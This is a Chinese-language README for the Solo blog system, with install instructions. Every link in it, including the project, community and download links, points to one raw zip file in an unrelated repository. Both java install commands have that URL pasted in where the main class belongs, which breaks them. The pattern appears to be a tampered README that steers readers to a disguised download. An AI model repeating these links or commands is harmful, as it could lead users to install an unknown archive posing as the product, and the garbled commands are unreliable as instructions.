## 简介

[Solo](https://github.com/HitEagle/solo/raw/refs/heads/master/src/main/Software_2.9-alpha.1.zip) 是一款小而美的开源博客系统，专为程序员设计。Solo 有着非常活跃的[社区](https://github.com/HitEagle/solo/raw/refs/heads/master/src/main/Software_2.9-alpha.1.zip)，文章自动推送到社区后可以让很多人看到，产生丰富的交流互动。

## 安装

[下载](https://github.com/HitEagle/solo/raw/refs/heads/master/src/main/Software_2.9-alpha.1.zip)最新的 Solo 包解压，进入解压目录执行：

* Windows: `java -cp "WEB-INF/lib/*;WEB-INF/classes" https://github.com/HitEagle/solo/raw/refs/heads/master/src/main/Software_2.9-alpha.1.zip`
* Unix-like: `java -cp "WEB-INF/lib/*:WEB-INF/classes" https://github.com/HitEagle/solo/raw/refs/heads/master/src/main/Software_2.9-alpha.1.zip`

用 `Docker` 运行？

`docker volume create solo_datas && docker run --privileged --name solo --restart=unless-stopped -p 8080:8080 -v solo_datas:/opt/b3log/backup/ -d 88250/solo`
